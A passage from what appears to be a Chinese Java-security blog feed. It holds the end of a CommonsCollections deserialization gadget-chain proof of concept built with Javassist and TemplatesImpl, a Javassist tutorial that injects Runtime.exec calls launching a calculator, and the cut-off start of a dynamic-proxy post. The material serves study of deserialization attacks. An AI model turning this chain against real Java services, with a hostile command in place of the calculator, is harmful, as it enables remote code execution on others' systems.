class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过反射获取 PriorityQueue 对象中的 queue 数组,</span></span><br><span class="line"><span class="comment">         * 并将准备好的 TemplatesImpl 对象添加到这个 queue 数组中,</span></span><br><span class="line"><span class="comment">         * 以保证后续执行 InvokerTransformer.transform() 时成功调用 TemplatesImpl 对象中的 newTransformer() 方法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl, <span class="number">1</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429003934416-602778476.png" alt="image-20220429003933584"></p><p>调用链</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429010904215-2047324148.png" alt="image-20220429010903433"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/7k4dlQ9pI1X0Smhcb-HOgA">https://mp.weixin.qq.com/s/7k4dlQ9pI1X0Smhcb-HOgA</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13860621.html">https://www.cnblogs.com/nice0e3/p/13860621.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;之前分析了cc1的利用链，但是cc1的利用链是有JDK版本限制的。在JDK8u71版本以后，对&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;的&lt;code&gt;readobject&lt;/code&gt;进行了改写，导致高版本中利用链无法使用，这在上文中分析过了。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Javassist动态编程</title>
    <link href="https://kpa1on.github.io/2022/04/27/Java%E5%AE%89%E5%85%A8%E4%B9%8BJavassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/"/>
    <id>https://kpa1on.github.io/2022/04/27/Java%E5%AE%89%E5%85%A8%E4%B9%8BJavassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/</id>
    <published>2022-04-27T14:19:12.000Z</published>
    <updated>2022-04-27T16:04:36.247Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="动态编程"><a href="#动态编程" class="headerlink" title="动态编程"></a>动态编程</h3><p>动态编程是相对于静态编程而言的,平时我们讨论比较多的就是静态编程语言，例如Java，与动态编程语言，例如JavaScript。</p><span id="more"></span><p>那二者有什么明显的区别呢？简单的说就是在静态编程中，类型检查是在编译时完成的，而动态编程中类型检查是在运行时完成的。所谓动态编程就是绕过编译过程在运行时进行操作的技术，在Java中有如下几种方式：</p><p><strong>反射</strong><br>这个搞Java的应该比较熟悉，原理也就是通过在运行时获得类型信息然后做相应的操作。</p><p><strong>动态编译</strong><br>动态编译是从Java 6开始支持的，主要是通过一个JavaCompiler接口来完成的。通过这种方式我们可以直接编译一个已经存在的java文件，也可以在内存中动态生成Java代码，动态编译执行。</p><p><strong>调用JavaScript引擎</strong><br>Java 6加入了对Script(JSR223)的支持。这是一个脚本框架，提供了让脚本语言来访问Java内部的方法。你可以在运行的时候找到脚本引擎，然后调用这个引擎去执行脚本。这个脚本API允许你为脚本语言提供Java支持。</p><p><strong>动态生成字节码</strong></p><p>这种技术通过操作Java字节码的方式在JVM中生成新类或者对已经加载的类动态添加元素。</p><p>方式：</p><p><strong>ASM</strong>：直接操作字节码指令，执行效率高，要是使用者掌握Java类字节码文件格式及指令，对使用者的要求比较高。</p><p><strong>Javassit</strong> ：提供了更高级的API，执行效率相对较差，但无需掌握字节码指令的知识，对使用者要求较低。</p><h3 id="什么是Javassist"><a href="#什么是Javassist" class="headerlink" title="什么是Javassist"></a>什么是Javassist</h3><p><code>Javassist</code>是一个开源的分析、编辑和创建Java字节码的类库，Java 字节码存储在称为类文件的二进制文件中。每个类文件包含一个 Java 类或接口。是由东京工业大学的数学和计算机科学系的 Shigeru Chiba （千叶 滋）所创建的。其主要的优点，在于简单，而且快速。直接使用java编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。而个人感觉在安全中最重要的就是在使用<code>Javassist</code>时我们可以像写Java代码一样直接插入Java代码片段，让我们不再需要关注Java底层的字节码的和栈操作，仅需要学会如何使用<code>Javassist</code>的API即可实现字节码编辑，类似于可以达到任意代码执行的效果。</p><h3 id="Javassist的使用"><a href="#Javassist的使用" class="headerlink" title="Javassist的使用"></a>Javassist的使用</h3><p>在<strong>Javassist</strong>中最为重要的是<code>ClassPool</code>，<code>CtClass</code> ，<code>CtMethod</code> 以及 <code>CtField</code>这几个类。</p><p>ClassPool：一个基于HashMap实现的CtClass对象容器，其中键是类名称，值是表示该类的CtClass对象。默认的ClassPool使用与底层JVM相同的类路径，因此在某些情况下，可能需要向ClassPool添加类路径或类字节。</p><p>CtClass：表示一个类，这些CtClass对象可以从ClassPool获得。</p><p>CtMethods：表示类中的方法。</p><p>CtFields ：表示类中的字段。</p><h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h4><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ClassPool<span class="title function_">getDefault</span><span class="params">()</span>返回默认的类池。</span><br><span class="line">  </span><br><span class="line">ClassPath<span class="title function_">insertClassPath</span><span class="params">(String pathname)</span>在搜索路径的开头插入目录或jar（或zip）文件。</span><br><span class="line">  </span><br><span class="line">ClassPath<span class="title function_">insertClassPath</span><span class="params">(ClassPath cp)</span>ClassPath在搜索路径的开头插入一个对象。</span><br><span class="line">  </span><br><span class="line">java.lang.ClassLoader<span class="title function_">getClassLoader</span><span class="params">()</span>获取类加载器</span><br><span class="line">  </span><br><span class="line">CtClass<span class="title function_">get</span><span class="params">(java.lang.String classname)</span>从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用。</span><br><span class="line">  </span><br><span class="line">ClassPath<span class="title function_">appendClassPath</span><span class="params">(ClassPath cp)</span> 将ClassPath对象附加到搜索路径的末尾。</span><br><span class="line">  </span><br><span class="line">CtClass<span class="title function_">makeClass</span><span class="params">(java.lang.String classname)</span>  创建一个新的<span class="keyword">public</span>类</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">setSuperclass</span><span class="params">(CtClass clazz)</span>更改超类，除非此对象表示接口。</span><br><span class="line"></span><br><span class="line">java.lang.Class&lt;?&gt;toClass(java.lang.invoke.MethodHandles.Lookup lookup)</span><br><span class="line">将此类转换为java.lang.Class对象。</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[]toBytecode()将该类转换为类文件。</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span><span class="title function_">writeFile</span><span class="params">()</span>将由此CtClass 对象表示的类文件写入当前目录。</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span><span class="title function_">writeFile</span><span class="params">(java.lang.String directoryName)</span> 将由此CtClass 对象表示的类文件写入本地磁盘。</span><br><span class="line"></span><br><span class="line">CtConstructor<span class="title function_">makeClassInitializer</span><span class="params">()</span>制作一个空的类初始化程序（静态构造函数）。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">insertBefore</span> <span class="params">(java.lang.String src)</span></span><br><span class="line">在正文的开头插入字节码。</span><br><span class="line"><span class="keyword">void</span><span class="title function_">insertAfter</span><span class="params">(java.lang.String src)</span></span><br><span class="line">在正文的末尾插入字节码。</span><br><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span> <span class="params">(CtMethod src, ClassMap map)</span></span><br><span class="line">从另一个方法复制方法体。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span><span class="params">(java.lang.String src)</span></span><br><span class="line">设置构造函数主体。</span><br><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span><span class="params">(CtConstructor src, ClassMap map)</span></span><br><span class="line">从另一个构造函数复制一个构造函数主体。</span><br><span class="line">CtMethod<span class="title function_">toMethod</span><span class="params">(java.lang.String name, CtClass declaring)</span></span><br><span class="line">复制此构造函数并将其转换为方法。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CtField"><a href="#CtField" class="headerlink" title="CtField"></a>CtField</h4><p>CtFields ：表示类中的字段。</p><h4 id="动态生成类"><a href="#动态生成类" class="headerlink" title="动态生成类"></a>动态生成类</h4><p>大致有如下几个步骤</p><ol><li>获取默认类池<code>ClassPool classPool = ClassPool.getDefault();</code></li><li>创建一个自定义类<code>CtClass ctClass = classPool.makeClass();</code></li><li>添加实现接口or属性or构造方法or普通方法</li></ol><ul><li><p>添加接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctClass.setInterfaces(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.makeInterface(<span class="string">&quot;java.io.Serializable&quot;</span>)&#125;);</span><br></pre></td></tr></table></figure></li><li><p>添加属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//新建一个int类型名为id的成员变量</span></span><br><span class="line"><span class="type">CtField</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;id&quot;</span>, ctClass);</span><br><span class="line"><span class="comment">//将id设置为public</span></span><br><span class="line">id.setModifiers(AccessFlag.PUBLIC);</span><br><span class="line"><span class="comment">//将该id属性&quot;赋值&quot;给ClassDemo</span></span><br><span class="line">ctClass.addField(id);</span><br></pre></td></tr></table></figure></li><li><p>添加构造方法(有参)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加有参构造方法</span></span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public ClassDemo(int id)&#123;this.id = id;&#125;&quot;</span>, ctClass);</span><br><span class="line">ctClass.addConstructor(ctConstructor1);</span><br></pre></td></tr></table></figure></li><li><p>添加方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void calcDemo()&#123;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">ctClass.addMethod(ctMethod);</span><br></pre></td></tr></table></figure></li></ul><ol start="4"><li><p>写入磁盘</p><p>这里写入磁盘可以用如下两种方法</p><ul><li>javassist自带的<code>ctClass.writeFile();</code>可指定绝对路径写入</li><li>也可转换为byte流通过<code>FileOutputStream</code>等写入磁盘</li></ul></li><li><p>进行验证：调用方法or属性赋值</p></li><li><p>tips：</p><ul><li>这里注意<code>javassist.CannotCompileException</code>异常: 因为同个 Class 是不能在同个 ClassLoader 中加载两次的，所以在输出 CtClass 的时候需要注意下,可以使用<code>javassist</code>自带的classloader解决此问题</li><li>反射时<code>newInstance()</code>抛出了<code>java.lang.InstantiationException</code>异常可能是因为没有写无参构造</li><li>如果已经加载了通过javassist生成的类，即便是通过反射(如<code>class.forName()</code>)或者<code>new</code>都不是加载一个<code>&quot;新类&quot;</code>，只有换一个ClassLoader加载才会是生成一个<code>&quot;新类&quot;</code></li></ul></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javassist.bytecode.AccessFlag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">JavassistDemo01</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavassistDemo01</span>();</span><br><span class="line">        a.makeClass0();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeClass0</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//获取默认类池</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//创建一个类ClassDemo</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;com.sec.test2.ClassDemo&quot;</span>);</span><br><span class="line">        <span class="comment">//让该类实现序列化接口</span></span><br><span class="line">        ctClass.setInterfaces(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.makeInterface(<span class="string">&quot;java.io.Serializable&quot;</span>)&#125;);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//新建一个int类型名为id的成员变量</span></span><br><span class="line">            <span class="type">CtField</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;id&quot;</span>, ctClass);</span><br><span class="line">            <span class="comment">//将id设置为public</span></span><br><span class="line">            id.setModifiers(AccessFlag.PUBLIC);</span><br><span class="line">            <span class="comment">//将该id属性&quot;赋值&quot;给ClassDemo</span></span><br><span class="line">            ctClass.addField(id);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加无参构造方法</span></span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public ClassDemo()&#123;&#125;;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(ctConstructor);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加有参构造方法</span></span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public ClassDemo(int id)&#123;this.id = id;&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(ctConstructor1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加普通方法1</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void calcDemo()&#123;java.lang.Runtime.getRuntime().exec(\&quot;cmd.exe /c calc.exe\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加普通方法2</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod1</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void hello()&#123;System.out.println(\&quot;Hello Javassist!!!\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(ctMethod1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将class文件写入磁盘</span></span><br><span class="line">            <span class="comment">//转换成字节流</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="comment">//写入磁盘</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">classPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;user.dir&quot;</span>), <span class="string">&quot;/src/main/java/com/sec/test2&quot;</span>), <span class="string">&quot;ClassDemo.class&quot;</span>);</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(classPath);</span><br><span class="line">            fos.write(bytes);</span><br><span class="line">            fos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//验证-调用方法</span></span><br><span class="line">            <span class="comment">//注意这里可能会抛javassist.CannotCompileException异常因为同个 Class 是不能在同个 ClassLoader 中加载两次的，所以在输出 CtClass 的时候需要注意下</span></span><br><span class="line">            <span class="comment">//需要通过一个未加载该class的classloader加载即可，为此javassist内置了一个classloader</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取javassist的classloader</span></span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader</span>(classPool);</span><br><span class="line">            System.out.println(<span class="string">&quot;loading&quot;</span>);</span><br><span class="line">            <span class="comment">//通过该classloader加载才是新的一个class</span></span><br><span class="line">            Class&lt;?&gt; clazz = loader.loadClass(<span class="string">&quot;com.sec.test2.ClassDemo&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射调用hello</span></span><br><span class="line">            clazz.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>).invoke(clazz.newInstance());</span><br><span class="line">            <span class="comment">//反射调用calc</span></span><br><span class="line">            clazz.getDeclaredMethod(<span class="string">&quot;calcDemo&quot;</span>).invoke(clazz.newInstance());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="动态获取类方法"><a href="#动态获取类方法" class="headerlink" title="动态获取类方法"></a>动态获取类方法</h4><ol><li>获取默认类池<code>ClassPool classPool = ClassPool.getDefault();</code></li><li>获取目标类<code>CtClass cc = cp.get();</code></li><li>获取类的方法<code>CtMethod m = cc.getDeclaredMethod();</code></li><li>插入任意代码<code>m.insertBefore(&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;&quot;);</code></li><li>转换为class对象<code>Class c = cc.toClass();</code></li><li>反射调用对象<code>JavassistDemo j= (JavassistDemo)c.newInstance();</code></li><li>执行方法<code>j.hello();</code></li></ol><p>tips：</p><ol><li>如果目标类未加载过，可以直接调用<code>toClass()</code>方法之后<code>new</code>一个该类的对象即可调用该类。</li><li>如果目标类已加载过，就需要用上面的方法，通过javassist的ClassLoader去加载后进行调用。</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/CoLo/p/15383642.html">https://www.cnblogs.com/CoLo/p/15383642.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;动态编程&quot;&gt;&lt;a href=&quot;#动态编程&quot; class=&quot;headerlink&quot; title=&quot;动态编程&quot;&gt;&lt;/a&gt;动态编程&lt;/h3&gt;&lt;p&gt;动态编程是相对于静态编程而言的,平时我们讨论比较多的就是静态编程语言，例如Java，与动态编程语言，例如JavaScript。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="动态编程" scheme="https://kpa1on.github.io/tags/%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Java动态代理</title>
    <link href="https://kpa1on.github.io/2022/04/25/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <id>https://kpa1on.github.io/2022/04/25/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</id>
    <published>2022-04-25T03:17:12.000Z</published>
    <updated>2022-04-26T05:00:15.721Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h3><p>为其他对象提供一个代理以控制对某个对象的访问。代理类主要负责为委托了（真实对象）预处理消息、过滤消息、传递消息给委托类，代理类不现实具体服务，而是利用委托类来完成服务，并将执行结果封装处理。</p><span id="more"></span><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>创建一个接口，然后创建被代理的类实现该接口并且实现该接口中的抽象方法。之后再创建一个代理类，同时使其也实现这个接口。在代理类中持有一个被代理对象的引用，而后在代理类方法中调用该对象的方法。</p><p>接口：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">HelloInterface</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayHello</span>()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>被代理类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">implements</span> <span class="title class_">HelloInterface</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        